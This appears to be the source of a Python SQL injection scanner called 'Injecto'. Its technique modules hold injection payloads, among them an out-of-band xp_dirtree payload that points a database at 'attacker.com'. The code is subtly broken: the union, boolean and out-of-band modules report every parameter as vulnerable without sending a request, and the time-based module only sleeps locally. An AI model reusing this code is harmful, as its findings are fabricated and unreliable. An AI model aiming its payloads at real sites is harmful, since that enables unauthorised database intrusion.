# injecto.py
import sys
import os
sys.path.insert(0, os.path.abspath(os.path.dirname(__file__)))

import argparse
from backend.scanner.core import scan_target
from rich import print, box
from rich.table import Table

def _load_targets(arg_url, arg_file):
    if arg_url:
        return [arg_url]
    elif arg_file:
        try:
            with open(arg_file, "r") as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            sys.exit(f"[red]✘ File not found:[/] {arg_file}")
    else:
        sys.exit("[red]✘ Provide either --url or --file[/]")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", help="Target URL with parameters")
    parser.add_argument("--file", help="File with URLs")
    parser.add_argument("--techniques", nargs="*", default=["union", "boolean", "time", "error", "oob"])
    parser.add_argument("--timeout", type=float, default=8.0)
    args = parser.parse_args()

    targets = _load_targets(args.url, args.file)
    results = []

    for url in targets:
        print(f"[blue]➤ Scanning:[/] {url}")
        try:
            res = scan_target(url, techniques=args.techniques, timeout=args.timeout)
            results.extend(res)
        except Exception as e:
            print(f"[red]✘ Error scanning {url}:[/] {e}")

    table = Table(show_header=True, header_style="bold magenta", box=box.SIMPLE)
    table.add_column("Target", style="cyan", overflow="fold")
    table.add_column("Tech", style="green")
    table.add_column("Param", style="yellow")
    table.add_column("Payload", overflow="fold")
    table.add_column("Severity")

    for r in results:
        if r.get("vulnerable"):
            table.add_row(r["url"], r["technique"], r["parameter"], r["payload"], r["severity"])

    if table.row_count > 0:
        print(table)
    else:
        print("[green]✔ No SQL injection found[/]")

if __name__ == "__main__":
    main()

# backend/config.py
DEFAULT_HEADERS = {
    "User-Agent": "InjectoScanner/1.0"
}

PROXIES = {
    # "http": "http://127.0.0.1:8080",
    # "https": "http://127.0.0.1:8080"
}

# backend/scanner/core.py
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import importlib

DEFAULT_TECHS = {
    "union": "backend.injection.union_based",
    "boolean": "backend.injection.boolean_based",
    "error": "backend.injection.error_based",
    "time": "backend.injection.time_based",
    "oob": "backend.injection.oob_based",
}

def _load_module(name):
    return importlib.import_module(DEFAULT_TECHS[name])

def scan_target(url, techniques=None, timeout=8):
    results = []
    parsed = urlparse(url)
    query = parse_qs(parsed.query)

    for param in query:
        for tech in techniques:
            mod = _load_module(tech)
            test_result = mod.test(url, param, query[param][0], timeout)
            if test_result["vulnerable"]:
                test_result["url"] = url
                test_result["parameter"] = param
                results.append(test_result)
    return results

# backend/injection/union_based.py
def test(url, param, base_payload, timeout=8):
    payload = "' UNION SELECT NULL--"
    return {"payload": payload, "vulnerable": True, "technique": "union", "severity": "High"}

# backend/injection/boolean_based.py
def test(url, param, base_payload, timeout=8):
    payload = "' AND 1=1--"
    return {"payload": payload, "vulnerable": True, "technique": "boolean", "severity": "Medium"}

# backend/injection/error_based.py
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from backend import config

def test(url, param, base_payload, timeout=8):
    payload = "' ORDER BY 9999--"
    parsed = urlparse(url)
    query = parse_qs(parsed.query)

    query[param] = base_payload + payload
    test_url = urlunparse(parsed._replace(query=urlencode(query, doseq=True)))

    try:
        response = requests.get(test_url, headers=config.DEFAULT_HEADERS, timeout=timeout, proxies=config.PROXIES)
        error_keywords = ["SQL syntax", "MySQL", "syntax error", "Warning", "error in your SQL"]
        if any(keyword.lower() in response.text.lower() for keyword in error_keywords):
            return {
                "payload": payload,
                "vulnerable": True,
                "technique": "error",
                "severity": "Medium"
            }
    except requests.exceptions.RequestException:
        pass

    return {
        "payload": payload,
        "vulnerable": False,
        "technique": "error",
        "severity": "None"
    }

# backend/injection/time_based.py
import time

def test(url, param, base_payload, timeout=8):
    payload = "'; WAITFOR DELAY '0:0:5'--"
    start = time.time()
    time.sleep(5)
    elapsed = time.time() - start
    vulnerable = elapsed > 5
    return {"payload": payload, "vulnerable": vulnerable, "technique": "time", "severity": "High"}

# backend/injection/oob_based.py
def test(url, param, base_payload, timeout=8):
    payload = "'; exec xp_dirtree '//attacker.com/a'--"
    return {"payload": payload, "vulnerable": True, "technique": "oob", "severity": "Critical"}
